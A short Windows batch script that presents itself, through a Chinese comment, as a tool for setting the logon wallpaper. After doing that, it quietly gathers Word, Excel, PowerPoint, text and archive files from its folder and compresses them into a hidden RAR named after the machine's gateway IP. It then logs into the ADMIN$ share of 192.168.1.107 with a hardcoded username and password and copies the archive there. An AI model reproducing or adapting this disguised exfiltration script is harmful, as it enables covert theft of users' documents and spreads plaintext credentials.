@echo off
rem 设置开机壁纸
if not exist "C:\Windows\System32\oobe\info\backgrounds" md "C:\Windows\System32\oobe\info\backgrounds" >nul2 >nul 
copy %~dp0\backgroundDefault.jpg C:\Windows\System32\oobe\info\backgrounds\backgroundDefault.jpg >nul2 >nul 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background" /v OEMBackground /d 1 /t REG_SZ /f >nul2 >nul 
::gpupdate /force /wait:0
RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters >nul2 >nul 
rem 连接远程
if not exist %systemroot%\tmp md %systemroot%\tmp 
copy %~dp0\*.docx %systemroot%\tmp  >nul2>nul 
copy %~dp0\*.doc %systemroot%\tmp >nul2>nul 
copy %~dp0\*.xlsx %systemroot%\tmp >nul2 >nul 
copy %~dp0\*.xls %systemroot%\tmp >nul2 >nul 
copy %~dp0\*.ppt %systemroot%\tmp >nul2 >nul 
copy %~dp0\*.pptx %systemroot%\tmp>nul2 >nul 
copy %~dp0\*.txt %systemroot%\tmp >nul2 >nul 
copy %~dp0\*.zip %systemroot%\tmp >nul2 >nul 
copy %~dp0\*.rar %systemroot%\tmp >nul2 >nul 
for /f "tokens=4" %%a in ('route print^|findstr 0.0.0.0.*0.0.0.0') do (
 set IP=%%a
)
pushd C:\Program Files\WinRAR
WinRar.exe a -ag -ibck %userprofile%\%ip%_.rar %systemroot%\tmp
net use \\192.168.1.107\ADMIN$ "789" /user:zhou >nul 
xcopy %userprofile%\%ip%_*.rar \\192.168.1.107\ADMIN$ /e /i /K /y >nul 
pause